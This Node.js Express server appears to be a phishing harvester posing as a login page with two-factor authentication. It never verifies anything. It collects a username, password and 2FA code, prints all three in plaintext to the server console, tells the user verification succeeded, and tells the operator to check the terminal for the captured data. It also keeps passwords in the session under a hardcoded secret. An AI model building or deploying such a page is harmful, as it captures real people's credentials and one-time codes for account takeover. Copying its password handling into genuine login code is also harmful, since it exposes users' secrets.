const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');

const app = express();
const PORT = 3000;

// Middleware for parsing request bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware for session management
app.use(
  session({
    secret: 'mysecretkey', // Replace with a strong secret in production
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 60000 }, // Use secure: true for HTTPS only
  })
);

// Serve static files (e.g., CSS/JS)
app.use(express.static('public'));

// Login Form
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Handle login form submission
app.post('/submit', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Save login data in session
  req.session.username = username;
  req.session.password = password;

  console.log('Session after /submit:', req.session); // Debugging line

  // Redirect to 2FA page
  res.redirect('/2fa');
});

// 2FA Form
app.get('/2fa', (req, res) => {
  console.log('Session Data at /2fa:', req.session); // Debugging line

  if (!req.session.username || !req.session.password) {
    console.log('Redirecting to login because session data is missing.');
    return res.redirect('/'); // Redirect to login if session is empty
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Two-Factor Authentication</title>
    </head>
    <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
      <h1>Two-Factor Authentication</h1>
      <form action="/verify-2fa" method="POST">
        <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
        <button type="submit">Verify</button>
      </form>
    </body>
    </html>
  `);
});

// Handle 2FA verification
app.post('/verify-2fa', (req, res) => {
  const authCode = req.body.authCode;

  console.log('Session Data at /verify-2fa:', req.session); // Debugging line

  const username = req.session.username;
  const password = req.session.password;

  if (!username || !password) {
    console.log('Error: Session data is missing.');
    return res.send('Error: Session expired. Please log in again.');
  }

  console.log(`2FA Verification Attempt - Username: ${username}, Password: ${password}, 2FA Code: ${authCode}`);

  // Destroy session after successful verification
  req.session.destroy();

  res.send('Two-Factor Authentication successful! Check your terminal for logs.');
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
